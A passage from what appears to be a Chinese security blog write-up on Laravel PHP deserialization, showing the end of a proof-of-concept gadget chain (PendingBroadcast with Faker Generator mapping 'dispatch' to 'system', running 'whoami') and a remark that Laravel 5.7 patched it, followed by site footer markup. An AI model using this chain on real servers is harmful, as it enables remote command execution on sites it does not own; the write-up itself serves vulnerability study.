class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span> = <span class="title class_">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; formatters = [<span class="string">&#x27;dispatch&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我发现Laravel5.7版本增加了wakeup方法修复了这条链子，原来这条链子是远古链子啊。。。</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602162924419.png" alt="image-20250602162924419"></p>
+<p>我发现这个框架的链子还是蛮多的，这里分享师傅的一篇文章<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/258264">https://www.anquanke.com/post/id/258264</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01Laravel%E6%A1%86%E6%9E%B6"><span class="toc-number">1.</span> <span class="toc-text">0x01Laravel框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x03靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x04漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05exp%E7%BC%96%E5%86%99"><span class="toc-number">5.</span> <span class="toc-text">0x05exp编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06exp%E4%BA%8C%E5%BC%80"><span class="toc-number">6.</span> <span class="toc-text">0x06exp二开</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07exp2"><span class="toc-number">7.</span> <span class="toc-text">0x07exp2</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&text=PHP反序列化-Laravel框架"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&is_video=false&description=PHP反序列化-Laravel框架"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP反序列化-Laravel框架&body=Check out this article: https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&name=PHP反序列化-Laravel框架&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&t=PHP反序列化-Laravel框架"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
